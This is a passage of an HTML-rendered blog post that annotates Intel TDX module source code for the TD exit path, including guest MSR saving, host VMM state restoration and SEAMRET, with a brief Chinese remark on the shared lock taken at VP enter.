class=\"type\">tdcs_epoch_tracking_fields_t</span>* epoch_tracking = &amp;tdcs_ptr-&gt;epoch_tracking;</span><br><span class=\"line\">        (<span class=\"type\">void</span>)_lock_xadd_16b(&amp;epoch_tracking-&gt;epoch_and_refcount.refcount[tdvps_ptr-&gt;management.vcpu_epoch &amp; <span class=\"number\">1</span>], (<span class=\"type\">uint16_t</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 4.  At this point TDR, TDCS and TDVPS will no longer be used during the flow.</span></span><br><span class=\"line\">    <span class=\"comment\">//     Release the shared lock on those control structures, which was acquired by TDHVPENTER.</span></span><br><span class=\"line\">    pamt_implicit_release_lock(vp_ctx-&gt;tdr_pamt_entry, TDX_LOCK_SHARED);</span><br><span class=\"line\">    pamt_unwalk(vp_ctx-&gt;tdvpr_pa, vp_ctx-&gt;tdvpr_pamt_block, vp_ctx-&gt;tdvpr_pamt_entry, TDX_LOCK_SHARED, PT_4KB);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Load host VMM state:</span></span><br><span class=\"line\">    set_seam_vmcs_as_active();</span><br><span class=\"line\">        _STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">set_seam_vmcs_as_active</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Set the SEAM VMCS as the current VMCS</span></span><br><span class=\"line\">            <span class=\"comment\">// SEAM VMCS addr: seamrr_base + page_size + (lp_id * page_size)</span></span><br><span class=\"line\">            <span class=\"type\">uint64_t</span> seam_vmcs_pa = get_global_data()-&gt;seamrr_base +</span><br><span class=\"line\">                                    (TDX_PAGE_SIZE_IN_BYTES * (get_local_data()-&gt;lp_info.lp_id + <span class=\"number\">1</span>));</span><br><span class=\"line\">        </span><br><span class=\"line\">            ia32_vmptrld((<span class=\"type\">vmcs_ptr_t</span>*)seam_vmcs_pa);</span><br><span class=\"line\">        </span><br><span class=\"line\">            get_local_data()-&gt;vp_ctx.active_vmcs = ACTIVE_VMCS_NONE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 5.  Load any host VMM state, which is not part of the output of TDHVPENTER, and that</span></span><br><span class=\"line\">    <span class=\"comment\">//     might have been modified by TDX-SEAM itself and by the guest TD, with synthetic INIT values.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// This is done before loading VMM state - to save additional XCR0/XSS save-restore</span></span><br><span class=\"line\">    initialize_extended_state(scrub_mask);</span><br><span class=\"line\">        <span class=\"type\">void</span> <span class=\"title function_\">initialize_extended_state</span><span class=\"params\">(<span class=\"type\">uint64_t</span> xfam)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ia32_xsetbv(<span class=\"number\">0</span>, xfam &amp; XCR0_USER_BIT_MASK);</span><br><span class=\"line\">            ia32_wrmsr(IA32_XSS_MSR_ADDR, xfam &amp; XCR0_SUPERVISOR_BIT_MASK);</span><br><span class=\"line\">        </span><br><span class=\"line\">            ia32_xrstors(&amp;get_global_data()-&gt;xbuf, xfam);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 6.  Restore host VMM CPU state from the TDX-SEAM LP-scope state save area.</span></span><br><span class=\"line\">    <span class=\"comment\">//     At this point, any flow that needed to update the host VMM state, e.g.,</span></span><br><span class=\"line\">    <span class=\"comment\">//     write to RDX as an output operand, has done so by updating the state save area.</span></span><br><span class=\"line\">    load_vmm_state_before_td_exit(tdx_local_data_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// In case of TDGVPVMCALL, Guest XMM&#x27;s will be passed down to VMM, based on XFAM.SSE bit</span></span><br><span class=\"line\">    <span class=\"comment\">// If the bit is 0 then they won&#x27;t be zeroed by initialization</span></span><br><span class=\"line\">    <span class=\"comment\">// In case of Async TDEXIT, set XMM0-15 of the VMM to 0.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (last_td_exit == LAST_EXIT_TDVMCALL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        load_xmms_by_mask(tdvps_ptr, xmm_select);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 7.   Run the common SEAMRET routine.</span></span><br><span class=\"line\">    tdx_vmm_post_dispatching();</span><br><span class=\"line\">            <span class=\"type\">void</span> <span class=\"title function_\">tdx_vmm_post_dispatching</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            advance_guest_rip();</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"type\">tdx_module_local_t</span>* local_data_ptr = get_local_data();</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// Restore IA32_SPEC_CTRL</span></span><br><span class=\"line\">            wrmsr_opt(IA32_SPEC_CTRL_MSR_ADDR, local_data_ptr-&gt;vmm_non_extended_state.ia32_spec_ctrl,</span><br><span class=\"line\">                                               TDX_MODULE_IA32_SPEC_CTRL);</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// If simplified LAM was saved &amp; disabled, restore its state</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (local_data_ptr-&gt;vmm_non_extended_state.ia32_lam_enable != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                ia32_wrmsr(IA32_LAM_ENABLE_MSR_ADDR, local_data_ptr-&gt;vmm_non_extended_state.ia32_lam_enable);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            mark_lp_as_free();</span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// Check that we have no mapped keyholes left</span></span><br><span class=\"line\">            tdx_sanity_check(local_data_ptr-&gt;keyhole_state.total_ref_count == <span class=\"number\">0</span>, SCEC_KEYHOLE_MANAGER_SOURCE, <span class=\"number\">20</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">            TDX_LOG(<span class=\"string\">&quot;tdx_vmm_post_dispatching - preparing to do SEAMRET\\n&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">            tdx_seamret_to_vmm(); <span class=\"comment\">// Restore GPRs and SEAMRET</span></span><br><span class=\"line\">            </span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"comment\">// Shouldn&#x27;t reach here:</span></span><br><span class=\"line\">            tdx_sanity_check(<span class=\"number\">0</span>, SCEC_VMM_DISPATCHER_SOURCE, <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//unreachable Code. Panic</span></span><br><span class=\"line\">    tdx_sanity_check(<span class=\"number\">0</span>, SCEC_TDEXIT_SOURCE, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 lock 是在 vp_enter 的时候拿的 是 shared lock</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">save_guest_td_state_before_td_exit</span><span class=\"params\">(<span class=\"type\">tdcs_t</span>* tdcs_ptr, <span class=\"type\">tdx_module_local_t</span>* local_data_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">tdx_module_global_t</span>* global_data = get_global_data();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">tdvps_t</span>* tdvps_ptr = local_data_ptr-&gt;vp_ctx.tdvps;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Extended state control</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr-&gt;executions_ctl_fields.cpuid_flags.xfd_supported)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_xfd = ia32_rdmsr(IA32_XFD_MSR_ADDR);</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_xfd_err = ia32_rdmsr(IA32_XFD_ERROR_MSR_ADDR);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// CR2 state</span></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.cr2 = ia32_store_cr2();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// XCR0 state</span></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.xcr0 = ia32_xgetbv(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Debug state</span></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.dr0 = ia32_store_dr0();</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.dr1 = ia32_store_dr1();</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.dr2 = ia32_store_dr2();</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.dr3 = ia32_store_dr3();</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_state.dr6 = ia32_store_dr6();</span><br><span class=\"line\"></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_ds_area = ia32_rdmsr(IA32_DS_AREA_MSR_ADDR);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (((<span class=\"type\">ia32_xcr0_t</span>)tdvps_ptr-&gt;management.xfam).lbr)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_lbr_depth = ia32_rdmsr(IA32_LBR_DEPTH_MSR_ADDR);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Perfmon State</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr-&gt;executions_ctl_fields.attributes.perfmon)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_fixed_ctr_ctrl = ia32_rdmsr(IA32_FIXED_CTR_CTRL_MSR_ADDR);</span><br><span class=\"line\">        <span class=\"comment\">//cpuid_config.values.edx.num_fcs  5bit: 0-32</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint8_t</span> i = <span class=\"number\">0</span>; i &lt; global_data-&gt;num_fixed_ctrs; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((global_data-&gt;fc_bitmap &amp; BIT(i)) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                tdvps_ptr-&gt;guest_msr_state.ia32_fixed_ctr[i] = ia32_rdmsr(IA32_FIXED_CTR0_MSR_ADDR + i);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>; i &lt; NUM_PMC; i++) <span class=\"comment\">// NUM_PMC = 8</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                tdvps_ptr-&gt;guest_msr_state.ia32_a_pmc[i] = ia32_rdmsr(IA32_A_PMC0_MSR_ADDR + i);</span><br><span class=\"line\">                tdvps_ptr-&gt;guest_msr_state.ia32_perfevtsel[i] = ia32_rdmsr(IA32_PERFEVTSEL0_MSR_ADDR + i);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            tdvps_ptr-&gt;guest_msr_state.ia32_offcore_rsp[i] = ia32_rdmsr(IA32_OFFCORE_RSPx_MSR_ADDR + i);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_perf_global_status = ia32_rdmsr(IA32_PERF_GLOBAL_STATUS_MSR_ADDR);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">1</span> == global_data-&gt;plt_common_config.ia32_perf_capabilities.perf_metrics_available)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            tdvps_ptr-&gt;guest_msr_state.ia32_perf_metrics = ia32_rdmsr(IA32_PERF_METRICS_MSR_ADDR);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_pebs_enable = ia32_rdmsr(IA32_PEBS_ENABLE_MSR_ADDR);</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_pebs_data_cfg = ia32_rdmsr(IA32_PEBS_DATA_CFG_MSR_ADDR);</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_pebs_ld_lat = ia32_rdmsr(IA32_PEBS_LD_LAT_MSR_ADDR);</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_pebs_frontend = ia32_rdmsr(IA32_PEBS_FRONTEND_MSR_ADDR);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr-&gt;executions_ctl_fields.cpuid_flags.waitpkg_supported)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_umwait_control= ia32_rdmsr(IA32_UMWAIT_CONTROL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (tdcs_ptr-&gt;executions_ctl_fields.cpuid_flags.tsx_supported)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tdvps_ptr-&gt;guest_msr_state.ia32_tsx_ctrl = ia32_rdmsr(IA32_TSX_CTRL_MSR_ADDR);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_uarch_misc_ctl = ia32_rdmsr(IA32_UARCH_MISC_CTL_MSR_ADDR);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Save the following MSRs:</span></span><br><span class=\"line\">    <span class=\"comment\">// IA32_STAR, IA32_LSTAR,</span></span><br><span class=\"line\">    <span class=\"comment\">// IA32_FMASK, IA32_KERNEL_GS_BASE, IA32_TSC_AUX</span></span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_star            = ia32_rdmsr(IA32_STAR_MSR_ADDR);</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_lstar           = ia32_rdmsr(IA32_LSTAR_MSR_ADDR);</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_fmask           = ia32_rdmsr(IA32_FMASK_MSR_ADDR);</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_kernel_gs_base  = ia32_rdmsr(IA32_KERNEL_GS_BASE_MSR_ADDR);</span><br><span class=\"line\">    tdvps_ptr-&gt;guest_msr_state.ia32_tsc_aux         = ia32_rdmsr(IA32_TSC_AUX_MSR_ADDR);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">void</span> <span class=\"title function_\">current_vmcs_guest_rip_advance</span><span class=\"params\">(<span class=\"type\">uint64_t</span> instruction_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> current_vmm_rip;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_RIP_ENCODE, &amp;current_vmm_rip);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (instruction_len == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ia32_vmread(VMX_VM_EXIT_INSTRUCTION_LENGTH_ENCODE, &amp;instruction_len);</span><br><span class=\"line\">        tdx_sanity_check(instruction_len != <span class=\"number\">0</span>, SCEC_HELPERS_SOURCE, <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ia32_vmwrite(VMX_GUEST_RIP_ENCODE, current_vmm_rip + instruction_len);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">clear_movss_sti_blocking</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">vmx_guest_inter_state_t</span> guest_inter_state;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_INTERRUPTIBILITY_ENCODE, &amp;guest_inter_state.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (guest_inter_state.blocking_by_mov_ss != <span class=\"number\">0</span> || guest_inter_state.blocking_by_sti != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        guest_inter_state.blocking_by_mov_ss = <span class=\"number\">0</span>;</span><br><span class=\"line\">        guest_inter_state.blocking_by_sti = <span class=\"number\">0</span>;</span><br><span class=\"line\">        ia32_vmwrite(VMX_GUEST_INTERRUPTIBILITY_ENCODE, guest_inter_state.raw);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">set_guest_pde_bs</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">ia32_rflags_t</span> rflags;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_RFLAGS_ENCODE, &amp;rflags.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">ia32_debugctl_t</span> debugctl;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_IA32_DEBUGCTLMSR_FULL_ENCODE, &amp;debugctl.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">pending_debug_exception_t</span> pde;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_PND_DEBUG_EXCEPTION_ENCODE, &amp;pde.raw);</span><br><span class=\"line\"></span><br><span class=\"line\">    pde.bs = (rflags.tf == <span class=\"number\">1</span> &amp;&amp; debugctl.btf == <span class=\"number\">0</span>) ? <span class=\"number\">1</span> : <span class=\"number\">0</span>;</span><br><span class=\"line\">    ia32_vmwrite(VMX_GUEST_PND_DEBUG_EXCEPTION_ENCODE, pde.raw);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">load_vmm_state_before_td_exit</span><span class=\"params\">(<span class=\"type\">tdx_module_local_t</span>* local_data_ptr)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">tdx_module_global_t</span>* global_data = get_global_data();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Clear CR2 to its INIT value</span></span><br><span class=\"line\">    ia32_load_cr2(CR2_RESET_STATE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Debug state restoration</span></span><br><span class=\"line\">    init_all_dr_opt(local_data_ptr-&gt;vp_ctx.tdvps);</span><br><span class=\"line\"></span><br><span class=\"line\">    wrmsr_opt(IA32_DS_AREA_MSR_ADDR, local_data_ptr-&gt;vmm_non_extended_state.ia32_ds_area, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_ds_area);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (local_data_ptr-&gt;vp_ctx.xfd_supported)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        init_msr_opt(IA32_XFD_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_xfd);</span><br><span class=\"line\">        init_msr_opt(IA32_XFD_ERROR_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_xfd_err);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Perfmon State</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (local_data_ptr-&gt;vp_ctx.attributes.perfmon)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint8_t</span> i = <span class=\"number\">0</span>; i &lt; global_data-&gt;num_fixed_ctrs; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((global_data-&gt;fc_bitmap &amp; BIT(i)) != <span class=\"number\">0</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                init_msr_opt(IA32_FIXED_CTR0_MSR_ADDR + i, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_fixed_ctr[i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>; i &lt; NUM_PMC; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                init_msr_opt(IA32_A_PMC0_MSR_ADDR + i, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_a_pmc[i]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            init_msr_opt(IA32_OFFCORE_RSPx_MSR_ADDR + i, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_offcore_rsp[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        ia32_wrmsr(IA32_PERF_GLOBAL_STATUS_RESET_MSR_ADDR, ia32_rdmsr(IA32_PERF_GLOBAL_STATUS_MSR_ADDR));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">1</span> == global_data-&gt;plt_common_config.ia32_perf_capabilities.perf_metrics_available)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            init_msr_opt(IA32_PERF_METRICS_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_perf_metrics);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    init_msr_opt(IA32_UARCH_MISC_CTL_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_uarch_misc_ctl);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     * Initialize the following MSRs:</span></span><br><span class=\"line\"><span class=\"comment\">     * IA32_STAR, IA32_LSTAR, IA32_FMASK, IA32_TSC_AUX,  &amp; IA32_KERNEL_GS_BASE</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    init_msr_opt(IA32_TSC_AUX_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_tsc_aux);</span><br><span class=\"line\">    init_msr_opt(IA32_STAR_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_star);</span><br><span class=\"line\">    init_msr_opt(IA32_LSTAR_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_lstar);</span><br><span class=\"line\">    init_msr_opt(IA32_FMASK_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_fmask);</span><br><span class=\"line\">    init_msr_opt(IA32_KERNEL_GS_BASE_MSR_ADDR, local_data_ptr-&gt;vp_ctx.tdvps-&gt;guest_msr_state.ia32_kernel_gs_base);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (local_data_ptr-&gt;vp_ctx.tdcs-&gt;executions_ctl_fields.cpuid_flags.tsx_supported)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ia32_wrmsr(IA32_TSX_CTRL_MSR_ADDR, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        wrmsr_opt(IA32_TSX_CTRL_MSR_ADDR, local_data_ptr-&gt;vmm_non_extended_state.ia32_tsx_ctrl, IA32_TSX_CTRL_DISABLE_VALUE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     *  Use vmwrite to update the following SEAM-VMCS guest fields</span></span><br><span class=\"line\"><span class=\"comment\">     *  IA32_DEBUGCTL, IA32_PERF_GLOBAL_CTRL, IA32_RTIT_CTL, IA32_LBR_CTL and DR7</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> debugctl_msr_value;</span><br><span class=\"line\">    ia32_vmread(VMX_GUEST_IA32_DEBUGCTLMSR_FULL_ENCODE, &amp;debugctl_msr_value);</span><br><span class=\"line\">    debugctl_msr_value = debugctl_msr_value &amp; IA32_DEBUGCTLMSR_MASK_BITS_PRESERVED;</span><br><span class=\"line\">    ia32_vmwrite(VMX_GUEST_IA32_DEBUGCTLMSR_FULL_ENCODE, debugctl_msr_value);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (local_data_ptr-&gt;vp_ctx.attributes.perfmon)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ia32_vmwrite(VMX_GUEST_IA32_PERF_GLOBAL_CONTROL_FULL_ENCODE, VMX_GUEST_IA32_PERF_GLOBAL_CONTROL_INIT_VALUE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (((<span class=\"type\">ia32_xcr0_t</span>)local_data_ptr-&gt;vp_ctx.xfam).pt)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ia32_vmwrite(VMX_GUEST_RTIT_CTL_FULL_ENCODE, VMX_GUEST_RTIT_CTL_INIT_VALUE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (((<span class=\"type\">ia32_xcr0_t</span>)local_data_ptr-&gt;vp_ctx.xfam).lbr)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ia32_vmwrite(VMX_GUEST_LBR_CTL_FULL_ENCODE, VMX_GUEST_LBR_CTL_INIT_VALUE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ia32_vmwrite(VMX_GUEST_DR7_ENCODE, VMX_GUEST_DR7_INIT_VALUE);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">init_msr_opt</span><span class=\"params\">(<span class=\"type\">uint64_t</span> addr, <span class=\"type\">uint64_t</span> cur_value)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (addr == IA32_FMASK_MSR_ADDR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur_value != IA32_FMASK_MSR_RESET_STATE)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ia32_wrmsr(IA32_FMASK_MSR_ADDR, IA32_FMASK_MSR_RESET_STATE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (addr == IA32_LBR_DEPTH_MSR_ADDR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur_value != IA32_LBR_DEPTH_MSR_RESET_STATE)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ia32_wrmsr(IA32_LBR_DEPTH_MSR_ADDR, IA32_LBR_DEPTH_MSR_RESET_STATE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"comment\">// All other MSR&#x27;s are reset to 0</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cur_value != <span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ia32_wrmsr(addr, <span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">_STATIC_INLINE_ <span class=\"type\">uint64_t</span> <span class=\"title function_\">ia32_store_dr0</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> dr0;</span><br><span class=\"line\">    _ASM_VOLATILE_ (<span class=\"string\">&quot;mov %%dr0, %0&quot;</span> : <span class=\"string\">&quot;=r&quot;</span> (dr0));</span><br><span 